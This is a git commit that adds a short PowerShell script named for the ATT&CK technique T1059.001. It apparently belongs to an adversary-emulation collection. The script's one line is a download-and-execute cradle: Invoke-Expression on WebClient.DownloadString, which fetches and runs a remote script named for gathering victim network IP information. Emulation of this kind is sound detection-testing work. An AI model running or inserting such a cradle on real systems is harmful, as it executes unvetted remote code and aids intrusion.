655863ddc602686360b459aba34334d278f22ea3
lehag7 <81866942+lehag7@users.noreply.github.com>
2021-05-19 16:03:06 -0500

    Create T1059-001-CommandAndScriptingInterpreterPowerShellExecution.ps1

---
+++ Scripts/T1059-001-CommandAndScriptingInterpreterPowerShellExecution.ps1
@@ -0,0 +1,4 @@
+## Author: lehag
+## Code: T1059-001-CommandAndScriptingInterpreterPowerShellExecution.ps1
+
+Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/lehag7/Powershell/main/Scripts/T1590-005-GatherVictimNetworkInformationIPAddresses.ps1');
